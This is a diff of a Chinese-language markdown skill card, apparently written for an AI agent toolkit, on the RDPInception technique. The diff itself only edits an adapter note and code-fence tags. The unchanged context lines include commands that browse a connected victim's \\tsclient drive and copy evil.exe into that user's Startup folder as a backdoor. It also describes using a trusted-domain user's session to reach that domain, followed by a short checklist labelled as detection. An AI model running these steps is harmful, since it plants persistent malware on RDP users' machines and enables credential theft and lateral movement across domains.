@@ -4,7 +4,7 @@ description: 'RDPInception：注入RDP会话→窃取用户凭据/跨域访问�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## RDPInception / RDP Sessions Abuse
 
@@ -31,15 +31,15 @@ dir \\tsclient\C\Users\<victim>\Desktop
 
 # 4. 在 RDP 用户挂载的驱动器中植入后门
 copy evil.exe \\tsclient\C\Users\<victim>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe
-```
+```text
 
 ### 跨域场景
 - 用户在受信域（trusted domain）RDP 到当前域
 - 注入其会话 → 用其凭据访问受信域资源
 
 ### 检测
-```
+```text
 [ ] query user → 是否有来自其他域的用户？
 [ ] tasklist → 是否有 mount 的 RDP 驱动器？
 [ ] 检查 \\tsclient 是否可访问
-```
+```text
